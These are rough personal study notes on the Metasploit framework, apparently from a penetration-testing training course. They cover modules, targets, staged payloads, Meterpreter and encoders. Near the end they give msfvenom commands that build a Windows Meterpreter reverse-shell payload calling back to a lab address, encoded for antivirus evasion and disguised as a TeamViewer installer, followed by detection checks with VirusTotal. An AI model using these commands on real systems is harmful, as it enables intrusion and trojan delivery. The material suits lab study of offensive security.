\\\\\\\\\\\\\\
MEtaploit 

-tool some toool leave unpredictable effect, read all doc about tools,
-set audit for tools by a solid methodology for preliminary checks and attack path.
\\Intro to Metaspoit
- includes a suite of tools that use for + test security vulnerabilities, enumerate, network, execute attacks, an evade detection,.
-at core it is a collection of commonly used tools that provide a complete environment for pen testing and exploit dev
\\Metaploit framework console
\\Understanding the Architecture
https://www.cobaltstrike.com/blog/cobalt-strike-rce-active-exploitation-reported
by default all the base files related to metasploit framework can be found under /usr/share/metasploit-framework in our
\\Data documentation lib
these are base files for the framework, the data and lib are the functioning parts of the msfconsole interface, while the doc folder contains all the technical details about the project
\\modules
$ls /usr/share/metasploit-framework/modules
\\Plugin
provide us more flexibility when using the msfconsole since they can easily be manually or automatically loaded as need to provide extra function and automation during assessment
$ls /usr/share/metasploit-framework/plugins/
\\Script
Meterpreter functionality and other usefull scripts
$ls /usr/share/metasploit-framework/scripts/
\\Tools
command-line utilities that can be called directly from the msfconsole menu
ls /usr/share/metasploit-framework/tools/
\\msfconsole
Preparation run it with option -q without banner
$help  
$msfupdate (outsite msfconsole) apt package manager can currently handle the update of modules and feature effortlessly
\\Installing MSF
$sudo apt update && sudo apt install metasploit-framework
this is when we start exploit our target after get enumeration process
-during the enumeration we look at target and identify which public facing services are running on it/http/ftp/what it db/
we need to start with a thorough scan of the target IP addr to determine what service running and what version is installed for each service
- looking for all version, outdated code , 
\\MSF Engagement Structure
MSF engagement structure can be devided into five main categories
+enumeration +preparation +exploitation +privilege escalation +Post-Exploitation
-MSF console engagement structure
\\\\\\\\\===============================
modules
-the exploit cate consits of so-called POC that used to exploit existing vul in largely automated manner.
\\Syntax
$<no.> <type>/<os>/<service>/<name>
\\Example
794 exploit/windows/ftp/scriptftp_list
\\Index No. use after search
\\type
they are set to introduce the structure alongside the interactable ones for better moduarization/
Type	Description
Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
Encoders	Ensure that payloads are intact to their destination.
Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
NOPs	(No Operation code) Keep the payload sizes consistent across exploit attempts.
Payloads	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).
Plugins	Additional scripts can be integrated within an assessment with msfconsole and coexist.
Post	Wide array of modules to gather information, pivot deeper, etc.
-when select a module to use for payload delivery the use <no.> command can only be used with the modules that can be used as initiators 
Type	Description
Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
Post	Wide array of modules to gather information, pivot deeper, etc.
\\os \\service \\Name \\
\\Searching for modules
$help search  >  $search eternalromance
\\MSF - Specific search
<cve:<year>> (platform:<os>) (type:<Auxiliary/exploit/post>) (rank:<rank>) (<pattern>)
$search type:exploit platform:windows cve:2021 rank:excellent microsoft
\\Module information
$<slected module>info
\\MSF-Target Specification
$set RHOSTS <iptarget>  $set LHOST <ippawn> >>exploit / run
\\\\\\\\\\\\============================
Targets
are unique OS identifier taken from the version of those specific OS which adapt the selected exploit module to run the particular version of the OS.
the show target will display all avail vul target for specific exploit while issue same command in the root menu/ outside any selected exploit module
\\MSF-Show Targets.
msf> show Target
\\Selecting Target
what type of target set for our exploit
incase concern let read info alway know what code behind artifact generation
\\MSF - Target Selection
msf> info looking at the description we can get a general idea of what this exploit accomplish for us
if leaving automatic target MSF will run a target identify 
\\Target typs
to identify a target correctly + Obtain a copy of the target binaries + use msfpescan to locate a suitable return address
\\\\\\\\\\\\\\\=======================================
Payloads
-there three diff type payload: singles, stagers, and stages.this serving diff typologies and type of task
-whether or not a payload is staged is represented by / in the payload name
-EX: windows/shell_bind_tcp is a single payload with no stage. whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell)
\\singles
payload contains the exploit and the entire shellcode for the selected task (all inone)
quite large and run selfpayload run imme after running. EX: adding a user or booting up a process
\\stagers
work with stage payloads to perform a specific task
- a stager waiting on the atk machine ready to establish a connection to the victim host once the stage completes its run on the remote host. Stager are typically used to set up a network connection betw the atk and victim and are designed to be small and reliable.
-MEtaploit will use the best one and fall back to a les-preferred one when necessary
-Windows NX vs. NO-NX Stager
    + Reliability issue for NX CPUs and deeper
    + NX stager are bigger (VirtualAlloc memory)
    + Default is now NX + Win7 Compatible
\\stages
are payload components that are downloaded by stager modules. the various payload stages provide advanced features with no size limits, 
such as Meterpreter, VNC Injection, and others, payload stages automatically use middle stagers:
    + A single recv() fails with large payloads
    + The Stager receives the middle stager
    + The middle stager then performs a Full downloaded
    + also better for RWM
\\Staged Payloads
simply put, an Exploitation process that is modularized and functionally separated to help segregate the diff fuctions it accomplishes into diff code blocks
> each completing its obj individually but working on chaining the atk together. this will ultimately grant an atk remote access to target machine if all the stages work correctly
-The scope of this payload , as  with any others besides granting shell access to the target system, is to be as compact and inconspicuos as possible to aid with the AV/IPS evasion as much as possible
- Stage0 of a staged payload represents the initial shellcode sent over the network to the target machine vul service, which has the sole purpose of initializing a connection back to the attacker machine
>> this is what known as a reverse connection. EX: + reverse_tcp, reverse_https, bind_tcp 
\\MSF - Staged Payloads
$show payloads
Reverse connection are less likely to trigger the prevention systems like the on initializing the conn is the victim host, -> security trust zone (anyway be care full)
>>stage0 aim to set a stable conn >> Stage1 send a large payload 
\\Meterpreter payload
Meterpreter payload is a specific type of multi-faced payload that uses DLL injection to ensure the conn to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes
-Meterpreter resides completely in memory of the remote host and leaves no traces on the hard drive, making it very diff to detect with conventional forenstic techniques, In addition, scripts and plugins can be loaded and unloaded dynamiclally as required
-Once the Meterpreter payload is executed, a new session is created, which spawns up the meterpreter interface. it is very simlimar to the msfconsole interface., but all available commands are aim at the target system, which the payload has infected it offers us a plethora of useful commands, varying from keystroke  capture password hash collection, microphone tapping and screening to impersonating process security tokens, we will delve into more detail about meterpreter in a later Selection
-using meterpreter we can also load in diff plugins to assist us with our assessment 
\\Searching for Payload
depend on what we want to do on the target machine
-we can automate and quickly deliver combined with plugins such as https://github.com/gentilkiwi/mimikatz
parts of the pentest while keeping an organized, time-effective asssessment
\\MSF-list Payloads
$show payloads
-we also can create our payload using msfvenom, 
EX: reverse_tcp_shell, we will using a Meterpreter Payload for Windows 7 (x64)
\\MSF-Searchin for specific payload
$grep meterpreter show payloads
$grep -c meterpreter show payloads
$grep meterpreter grep reverse_tcp show payloads
$grep -c meterpreter grep reverse_tcp show payloads
\\MSF - Select payload
msf> ms_17,... > show options  >  set payload 15
after selecting a payload, we will have more options available to us
\\Using Payloads
Parameter	Description
RHOSTS	The IP address of the remote host, the target machine.
RPORT	Does not require a change, just a check that we are on port 445, where SMB is running.
For the payload part, we will need to set the following:
Parameter	Description
LHOST	The host's IP address, the attacker's machine.
LPORT	Does not require a change, just a check that the port is not already in use.
\\MSF -Exploit and Payload Configuration
msf> ifconfig set rhosts lhost then run exploit 
meterpreter>getuid
-the prompt is not a windows command line one but a Meterpreter prompt, the whoami typically used windows, doesnot work here. instead we can use the linux equivalent of getuid.
\\MSF-Meterpreter commands
$help  
\\MSF-Meterpreter Navigation
$cd Users  > ls >shell  <channel 1> mena conn betw atk -> target established in a reverse TCP connection using Meterpreter Stager and Stage.
the stager was activated on our machine to await a conn request initialized by the Stage payload on the target machine
-Moving to standard shell on the target is helpful in some cases,
\\MSF - Window command
Payload	Description
generic/custom	Generic listener, multi-use
generic/shell_bind_tcp	Generic listener, multi-use, normal shell, TCP connection binding
generic/shell_reverse_tcp	Generic listener, multi-use, normal shell, reverse TCP connection
windows/x64/exec	Executes an arbitrary command (Windows x64)
windows/x64/loadlibrary	Loads an arbitrary x64 library path
windows/x64/messagebox	Spawns a dialog via MessageBox using a customizable title, text & icon
windows/x64/shell_reverse_tcp	Normal shell, single payload, reverse TCP connection
windows/x64/shell/reverse_tcp	Normal shell, stager + stage, reverse TCP connection
windows/x64/shell/bind_ipv6_tcp	Normal shell, stager + stage, IPv6 Bind TCP stager
windows/x64/meterpreter/$	Meterpreter payload + varieties above
windows/x64/powershell/$	Interactive PowerShell sessions + varieties above
windows/x64/vncinject/$	VNC Server (Reflective Injection) + varieties above

HTB{MSF_Expl01t4t10n}
\\\\\\\\\\\==================================
Encoders
have assisted with making payloads compatible with diff processor architectures while at the same time helping with antivirus evasion.
+x64 +x86 + sparc +ppc +mips
-they needed to remove hexadecimal opcodes known as bad characters from the payload. not only but encoding the payload in diff formats could help with the AV detection as mentioned above. 
the use of encoders strictly for AV evasion has diminished over time. as IPS/IDS manufacturers have improved how their protection software deal with signatures in malware and various
-Shikata Ga Nai (SGN) was one of the most utilized encoding schemas back in the day because it was very hard to detect payloads encoded through its mechanism.
-modern detection methods have caugh up, and these encoded payloads are far from being universally undetectable anymore.
-the name It cannot be helped or Nothing can be done about it https://cloud.google.com/blog/topics/threat-intelligence/shikata-ga-nai-encoder-still-going-strong/
\\Selecting an Encoders
msfpayload and msfencode in /usr/share/framework2/
-if we wanted to create our custom payload, we could do so through msfpayload, but we would have to encode it according to the target OS architecture using msfencode afterward
apipe would take the output from one command and feed it into the next
$msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
\\Generating Payload - Without encoding 
$msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
look at the first line $buf and see how it changes when applying an encoder like shikata_ga_nai
\\Generating Payload - With encoding
$msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
\\Shikata Ga Nai encoding
https://hatching.io/blog/metasploit-payloads2/
-want to select an Encoder for an existing payload. then use show encoder to see which encoders are available for  current exploit module + payload
msf> show encoders
some module need compatible encoder
NOTE if we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today.
$msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
>> one better option would be to try running it through mutiple iteration of the same encoding scheme:
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
 -it still not enough to evasion AV.
-alternative  metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payload. it require free regis virustotal
$msf-virustotal -k <API key> -f TeamViewerInstall.exe
\\\\\\\\\\\\\\\\\\==============================
DataBases
